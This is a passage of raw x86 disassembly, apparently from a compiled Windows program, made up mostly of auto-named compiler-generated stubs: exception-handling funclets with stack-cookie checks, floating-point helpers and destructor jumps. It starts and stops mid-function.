fxch st6
fstp [ esp + 0xc ]
call sub_457e40
fxch st6
add esp 0x2c
retn
sub_4583ca
fstp [ esp + 0xc ]
fxch st6
fstp [ esp ]
call sub_457e40
fxch st6
fld [ esp + 0xc ]
add esp 0x2c
retn
sub_4583e2
fstp [ esp + 0xc ]
fxch st6
fstp [ esp ]
call sub_457e40
fxch st6
add esp 0x2c
retn
sub_45861c
push eax
sub esp 0x2c
fstp [ esp ]
fstp [ esp + 0xc ]
call sub_457e40
add esp 0x2c
pop eax
retn
sub_458631
push eax
sub esp 0x2c
fstp [ esp + 0xc ]
fstp [ esp ]
call sub_457e40
add esp 0x2c
pop eax
retn
sub_458bb9
call sub_45884c
retn
sub_458bbf
call sub_458b04
retn
sub_458bc5
fpatan
retn
sub_458bc8
fptan
retn
sub_458da0
lea ecx [ ebp - 0x28 ]
jmp sub_429da0
sub_458da8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_458dc3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_458dde
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_458e00
mov eax [ ebp - 0x10 ]
push eax
call sub_43f960
pop ecx
retn
sub_458e0b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4 ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_458e30
mov eax [ ebp - 0x10 ]
push eax
call sub_43f960
pop ecx
retn
sub_458e3b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_458e60
mov ecx [ ebp - 0x10 ]
jmp sub_42a610
sub_458e68
mov eax [ ebp - 0x10 ]
add eax 0x20
jmp sub_42a260
sub_458e73
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_458e90
lea eax [ ebp - 0x10 ]
jmp sub_42a260
sub_458e98
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_458ec0
lea eax [ ebp + 0x4 ]
jmp sub_42a260
sub_458ec8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_458ef0
mov eax [ ebp - 0x20 ]
push eax
call sub_43f97a
pop ecx
retn
sub_458efb
lea eax [ ebp + 0x8 ]
jmp sub_419420
sub_458f03
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_458f20
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_458f40
mov eax [ ebp - 0x10 ]
add eax 0x4
jmp sub_4062c0
sub_458f4b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_458f70
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_458f90
mov eax [ ebp + 0x4 ]
jmp sub_4014b0
sub_458f98
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4 ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_458fc0
mov ecx [ ebp - 0x10 ]
jmp sub_42ac70
sub_458fc8
mov esi [ ebp - 0x10 ]
add esi 0x2c
jmp sub_42a6b0
sub_458fd3
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_458ff0
lea esi [ ebp - 0x58 ]
jmp sub_4274e0
sub_458ff8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x5c ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_43f96b
add eax 0x0
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459020
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459040
lea esi [ ebp - 0x10 ]
jmp sub_41aed0
sub_459048
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459070
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459090
lea eax [ ebp - 0x28 ]
jmp sub_4062c0
sub_459098
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x28 ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_43f96b
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_4590c0
lea eax [ ebp + 0x4 ]
jmp sub_4062c0
sub_4590c8
mov edx [ esp + 0x8 ]
lea eax [ edx ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_4590f0
lea eax [ ebp + 0x4 ]
jmp sub_4062c0
sub_4590f8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459120
lea eax [ ebp - 0x40c ]
jmp sub_419420
sub_45912b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x40c ]
mov ecx [ edx - 0x410 ]
xor ecx eax
call sub_43f96b
add eax 0xc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459160
lea edi [ ebp + 0x8 ]
jmp sub_402bf0
sub_459168
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459190
mov ecx [ ebp + 0x4 ]
jmp sub_42ac70
sub_459198
mov esi [ ebp + 0x4 ]
add esi 0x2c
jmp sub_42a6b0
sub_4591a3
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x10 ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_4591c0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_4591e0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
j_sub_420d30
jmp sub_420d30
sub_459205
mov eax [ ebp - 0xcc ]
add eax 0x20
jmp sub_421160
sub_459213
mov eax [ ebp - 0xcc ]
add eax 0x40
jmp sub_421160
sub_459221
mov eax [ ebp - 0xcc ]
add eax 0x60
jmp sub_421160
sub_45922f
mov eax [ ebp - 0xcc ]
add eax 0x78
jmp sub_421160
sub_45923d
mov eax [ ebp - 0xcc ]
add eax 0x90
jmp sub_421160
sub_45924d
mov eax [ ebp - 0xcc ]
add eax 0xa8
jmp sub_421160
sub_45925d
mov eax [ ebp - 0xcc ]
add eax 0xc0
jmp sub_421160
sub_45926d
mov eax [ ebp - 0xcc ]
add eax 0xd8
jmp sub_421160
sub_45927d
mov eax [ ebp - 0xcc ]
add eax 0xf0
jmp sub_421160
sub_45928d
mov eax [ ebp - 0xcc ]
add eax 0x108
jmp sub_421160
sub_45929d
mov eax [ ebp - 0xcc ]
add eax 0x120
jmp sub_421160
sub_4592ad
mov eax [ ebp - 0xcc ]
add eax 0x138
jmp sub_421160
sub_4592bd
mov eax [ ebp - 0xcc ]
add eax 0x150
jmp sub_421160
sub_4592cd
mov eax [ ebp - 0xcc ]
add eax 0x178
jmp sub_421160
sub_4592dd
mov eax [ ebp - 0xcc ]
add eax 0x190
jmp sub_421160
sub_4592ed
mov eax [ ebp - 0xcc ]
add eax 0x1a8
jmp sub_421160
sub_4592fd
mov eax [ ebp - 0xcc ]
add eax 0x1c0
jmp sub_421160
sub_45930d
mov eax [ ebp - 0xcc ]
add eax 0x1d8
jmp sub_421160
sub_45931d
mov eax [ ebp - 0xcc ]
add eax 0x1f0
jmp sub_421160
sub_45932d
mov eax [ ebp - 0xcc ]
add eax 0x208
jmp sub_421160
sub_45933d
mov eax [ ebp - 0xcc ]
add eax 0x220
jmp sub_421160
sub_45934d
mov eax [ ebp - 0xcc ]
add eax 0x238
jmp sub_421160
sub_45935d
mov eax [ ebp - 0xcc ]
add eax 0x250
jmp sub_421160
sub_45936d
mov esi [ ebp - 0xcc ]
add esi 0x26c
jmp sub_41ea90
sub_45937e
mov esi [ ebp - 0xcc ]
add esi 0x270
jmp sub_41ea90
sub_45938f
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xd0 ]
mov ecx [ edx - 0xd4 ]
xor ecx eax
call sub_43f96b
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_4593c0
lea esi [ ebp - 0x20 ]
jmp sub_41a400
sub_4593c8
lea esi [ ebp - 0x24 ]
jmp sub_41a400
sub_4593d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_4593f0
lea eax [ ebp - 0x10 ]
jmp sub_4062c0
sub_4593f8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459420
lea eax [ ebp + 0x4 ]
jmp sub_4062c0
sub_459428
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4 ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459450
lea eax [ ebp - 0x14 ]
jmp sub_4062c0
sub_459458
lea eax [ ebp + 0x8 ]
jmp sub_4062c0
sub_459460
lea eax [ ebp + 0xc ]
jmp sub_4062c0
sub_459468
lea eax [ ebp + 0x8 ]
jmp sub_4062c0
sub_459470
lea eax [ ebp - 0x18 ]
jmp sub_4062c0
sub_459478
lea eax [ ebp + 0xc ]
jmp sub_4062c0
sub_459480
lea eax [ ebp - 0x10 ]
jmp sub_4062c0
sub_459488
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x18 ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_4594b0
lea edi [ ebp - 0x14 ]
jmp sub_402bf0
sub_4594b8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x14 ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_4594e0
mov ecx [ ebp + 0x4 ]
jmp sub_42ac70
sub_4594e8
mov eax [ ebp + 0x4 ]
add eax 0x34
jmp sub_42a260
sub_4594f3
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x10 ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459510
mov ecx [ ebp + 0x4 ]
jmp sub_42ac70
sub_459518
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x10 ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459540
mov ecx [ ebp - 0x10 ]
jmp sub_43fb60
sub_459548
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459570
lea esi [ ebp - 0x30 ]
jmp sub_422c80
sub_459578
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x34 ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_4595a0
lea esi [ ebp + 0x8 ]
jmp sub_41ea90
sub_4595a8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x34 ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_4595d0
lea eax [ ebp ]
jmp sub_41a720
sub_4595d8
lea eax [ ebp ]
jmp sub_41a720
sub_4595e0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_43f96b
mov ecx [ edx + 0x2110 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459610
lea eax [ ebp - 0x60 ]
jmp sub_41a790
sub_459618
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x74 ]
mov ecx [ edx - 0x78 ]
xor ecx eax
call sub_43f96b
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459640
lea esi [ ebp + 0x8 ]
jmp sub_41aed0
sub_459648
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x10 ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459670
lea esi [ ebp - 0x14 ]
jmp sub_419cf0
sub_459678
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x14 ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_4596a0
lea ecx [ ebp - 0x220 ]
jmp sub_419cd0
sub_4596ab
lea eax [ ebp - 0x22c ]
jmp sub_4062c0
sub_4596b6
lea eax [ ebp - 0x224 ]
jmp sub_4062c0
sub_4596c1
lea eax [ ebp - 0x230 ]
jmp sub_4062c0
sub_4596cc
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x234 ]
mov ecx [ edx - 0x238 ]
xor ecx eax
call sub_43f96b
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459700
mov eax [ ebp + 0x4 ]
add eax 0x28
jmp sub_4172d0
sub_45970b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4 ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
j_sub_4229f0#5
jmp sub_4229f0
sub_459735
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459750
push rw-data
mov eax [ ebp - 0x10 ]
push eax
call sub_43fc81
add esp 0x8
retn
sub_459762
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4 ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459780
lea ecx [ ebp - 0x2d8 ]
jmp sub_422900
sub_45978b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2e4 ]
mov ecx [ edx - 0x2e8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_4597b0
lea eax [ ebp + 0x8 ]
jmp sub_42a260
sub_4597b8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x18 ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_4597e0
mov eax [ ebp + 0x8 ]
push eax
call sub_43f960
pop ecx
retn
sub_4597eb
mov eax [ ebp + 0x8 ]
push eax
call sub_43f960
pop ecx
retn
sub_4597f6
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459820
lea eax [ ebp + 0x8 ]
jmp sub_42a260
sub_459828
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459850
lea eax [ ebp + 0x4 ]
jmp sub_42a260
sub_459858
lea eax [ ebp - 0x10 ]
jmp sub_42a260
sub_459860
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x14 ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459880
mov ecx [ ebp - 0x10 ]
jmp sub_43fb60
sub_459888
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_4598b0
mov ecx [ ebp + 0x4 ]
jmp sub_422900
j_sub_4229f0#7
jmp sub_4229f0
sub_4598bd
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4 ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
j_sub_4229f0#8
jmp sub_4229f0
sub_4598e5
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4 ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459900
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp sub_422900
sub_459919
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x14 ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459940
lea esi [ ebp - 0x2254 ]
jmp sub_41b520
sub_45994b
lea esi [ ebp - 0x2220 ]
jmp sub_41b520
sub_459956
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x225c ]
mov ecx [ edx - 0x2260 ]
xor ecx eax
call sub_43f96b
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459990
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_4599b0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_4599d0
lea ecx [ ebp - 0x30 ]
jmp sub_429da0
sub_4599d8
jmp sub_4229f0
sub_4599dd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_43f96b
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459a10
mov ecx [ ebp + 0x4 ]
jmp sub_429da0
sub_459a18
mov esi [ ebp + 0x4 ]
add esi 0x1c
jmp sub_429950
sub_459a23
mov esi [ ebp + 0x4 ]
add esi 0x38
jmp sub_429950
sub_459a2e
mov esi [ ebp + 0x4 ]
add esi 0x54
jmp sub_429950
sub_459a39
mov esi [ ebp + 0x4 ]
add esi 0x74
jmp sub_429950
sub_459a44
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459a60
lea esi [ ebp - 0x78 ]
jmp sub_42a6b0
sub_459a68
lea esi [ ebp - 0x54 ]
jmp sub_42a6b0
sub_459a70
lea esi [ ebp - 0x30 ]
jmp sub_42a6b0
sub_459a78
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8c ]
mov ecx [ edx - 0x90 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459aa0
mov eax [ ebp + 0x8 ]
push eax
call sub_43f960
pop ecx
retn
sub_459aab
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x14 ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459ad0
lea eax [ ebp + 0x4 ]
jmp sub_42a260
sub_459ad8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x1c ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459b00
mov eax [ ebp - 0x10 ]
push eax
call sub_43f960
pop ecx
retn
sub_459b0b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459b30
lea esi [ ebp - 0x28 ]
jmp sub_429950
sub_459b38
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x28 ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459b60
lea ecx [ ebp - 0x50 ]
jmp sub_429da0
sub_459b68
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x54 ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459b90
lea esi [ ebp - 0x234 ]
jmp sub_429950
sub_459b9b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x240 ]
mov ecx [ edx - 0x244 ]
xor ecx eax
call sub_43f96b
add eax 0xc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459bd0
mov ecx [ ebp + 0x4 ]
add ecx 0x8
jmp j_sub_418fb0
sub_459bdb
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4 ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459c00
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
j_sub_4229f0#4
jmp sub_4229f0
sub_459c25
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459c40
lea ecx [ ebp - 0x50 ]
jmp sub_429da0
sub_459c48
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x44 ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459c70
lea ecx [ ebp - 0x54 ]
jmp sub_429da0
sub_459c78
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4c ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459ca0
lea ecx [ ebp - 0x30 ]
jmp sub_429da0
sub_459ca8
lea ecx [ ebp - 0x4c ]
jmp sub_429da0
sub_459cb0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_43f96b
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459ce0
mov eax [ ebp + 0x4 ]
jmp sub_40f8c0
sub_459ce8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4 ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459d10
mov esi [ ebp + 0x4 ]
jmp sub_402480
sub_459d18
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4 ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459d40
lea ecx [ ebp - 0x28 ]
jmp sub_429da0
sub_459d48
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x30 ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459d70
mov esi [ ebp + 0x4 ]
add esi 0x8
jmp sub_402480
sub_459d7b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4 ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459da0
lea ecx [ ebp - 0x2c ]
jmp sub_429da0
sub_459da8
lea ecx [ ebp - 0x48 ]
jmp sub_429da0
sub_459db0
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4c ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459dd0
lea esi [ ebp - 0x30 ]
jmp sub_429950
sub_459dd8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x68 ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_43f96b
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459e00
lea esi [ ebp - 0x28 ]
jmp sub_429950
sub_459e08
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x24 ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459e30
jmp sub_4229f0
sub_459e35
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459e50
mov ecx [ ebp + 0x4 ]
add ecx 0x28
jmp sub_422900
sub_459e5b
mov edi [ ebp + 0x4 ]
add edi 0x2c
jmp j_sub_422960
j_sub_4229f0#6
jmp sub_4229f0
sub_459e6b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459e90
lea esi [ ebp - 0x1c ]
jmp sub_41aed0
sub_459e98
lea eax [ ebp ]
jmp sub_41a720
sub_459ea0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_43f96b
mov ecx [ edx + 0x410 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459ed0
lea esi [ ebp + 0x8 ]
jmp sub_41aed0
sub_459ed8
mov edx [ esp + 0x8 ]
lea eax [ edx ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459f00
lea esi [ ebp - 0x10 ]
jmp sub_41aed0
sub_459f08
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4 ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459f30
mov eax [ ebp - 0x18 ]
push eax
call sub_43f960
pop ecx
retn
sub_459f3b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459f60
mov ecx [ ebp - 0x10 ]
add ecx 0x8
jmp j_sub_418fb0
sub_459f6b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459f90
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
j_sub_4229f0#3
jmp sub_4229f0
sub_459fb5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459fd0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_459ff0
mov eax [ ebp + 0x8 ]
jmp sub_40f8c0
sub_459ff8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_45a020
mov esi [ ebp + 0x4 ]
jmp sub_429950
sub_45a028
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x10 ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_43f96b
mov eax r--data
jmp sub_442f84
sub_45a050
mov esi [ ebp + 0x4 ]
add esi 0x30
jmp sub_4221e0
sub_45a05b
mov esi [ ebp + 0x4 ]
add esi 0x114
jmp sub_4221e0
sub_45a069
mov esi [ ebp + 0x4 ]
add esi 0x168
jmp sub_4221e0
sub_45a077
mov esi [ ebp + 0x4 ]
add esi 0x1bc
jmp sub_4221e0
sub_45a085
mov esi [ ebp + 0x4 ]
add esi 0x210
jmp sub_4221e0
sub_45a093
mov esi [ ebp + 0x4 ]
add esi 0x264
jmp sub_4221e0
sub_45a0a1
mov esi [ ebp + 0x4 ]
add esi 0x2b8
jmp sub_4221e0
sub_45a0af
mov esi [ ebp + 0x4 ]
add esi 0x344
jmp sub_4221e0
sub_45a0bd
mov edx [ esp + 0x8 ]
